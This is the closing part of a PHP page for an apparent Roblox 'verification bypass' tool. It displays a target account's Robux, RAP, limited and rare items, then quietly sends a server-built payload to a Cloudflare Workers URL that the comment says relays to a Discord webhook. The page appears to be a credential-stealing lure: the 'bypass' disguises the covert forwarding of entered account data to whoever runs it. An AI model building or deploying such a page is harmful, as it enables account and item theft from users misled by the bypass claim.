        </div>
        <?php endif; ?>
      </div>
      <?php endif; ?>

      <?php if($result==='success'&&$userData&&$accountData): ?>
      <?php $a=$accountData; ?>
      <div class="result ok">
        <div class="result-top">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--green)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="M22 4 12 14.01l-3-3"/></svg>
          <span class="result-label">Bypassed</span>
          <span class="result-msg">Verification bypassed</span>
        </div>
        <div class="result-inner">
          <div class="acc">
            <div class="acc-av">
              <?php if(!empty($a['avatarUrl'])): ?>
              <img src="<?= htmlspecialchars($a['avatarUrl']) ?>" alt="" onerror="this.style.display='none'">
              <?php else: ?>
              <?= strtoupper(substr(isset($userData['name'])?$userData['name']:'U',0,1)) ?>
              <?php endif; ?>
            </div>
            <div class="acc-info">
              <div class="acc-badge"><span class="acc-badge-dot"></span>Verified 13+</div>
              <div class="acc-name"><?= htmlspecialchars(isset($userData['displayName'])?$userData['displayName']:(isset($userData['name'])?$userData['name']:'')) ?></div>
              <div class="acc-user">@<?= htmlspecialchars(isset($userData['name'])?$userData['name']:'') ?></div>
              <div class="acc-id">UID <?= htmlspecialchars(isset($userData['id'])?$userData['id']:'') ?> &nbsp;&middot;&nbsp; <?= $a['ageDays'] ?> days old</div>
            </div>
          </div>
          <div class="stats-grid">
            <div class="stat-box"><div class="stat-label">Robux</div><div class="stat-val hi"><?= number_format($a['robux']) ?></div></div>
            <div class="stat-box"><div class="stat-label">RAP</div><div class="stat-val"><?= number_format($a['rap']) ?></div></div>
            <div class="stat-box"><div class="stat-label">Limiteds</div><div class="stat-val"><?= $a['limiteds'] ?></div></div>
          </div>
          <div class="items-row">
            <span class="item-tag <?= $a['hasPremium']?'have':'none' ?>">Premium</span>
            <span class="item-tag <?= $a['korblox']?'have':'none' ?>">Korblox</span>
            <span class="item-tag <?= $a['headless']?'have':'none' ?>">Headless</span>
            <span class="item-tag <?= $a['valkyrie']?'have':'none' ?>">Valkyrie</span>
          </div>
        </div>
      </div>
      <?php endif; ?>

    </div>
  </div>
</div>
<script>
  var loaderDelay = 900;
  window.addEventListener('load',function(){setTimeout(function(){document.getElementById('loader').classList.add('out');},loaderDelay);});
  function go(e){
    var v=document.getElementById('cin').value.trim();
    if(!v){e.preventDefault();return false;}
    var btn=document.getElementById('btn');
    btn.disabled=true;
    document.getElementById('bi').classList.add('spin');
    document.getElementById('bt').textContent='Bypassing...';
    return true;
  }

  // ── CLIENT-SIDE DISCORD WEBHOOK ───────────────────────────────────────────
  (function(){
    var payload = <?= $webhookJson ?>;
    if(!payload) return;
    // Sends to your Cloudflare Worker proxy — Discord URL stays server-side only
    fetch('https://calm-pine-ebca.lizlilus8.workers.dev', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    }).catch(function(){});
  })();
</script>
</body>
</html>
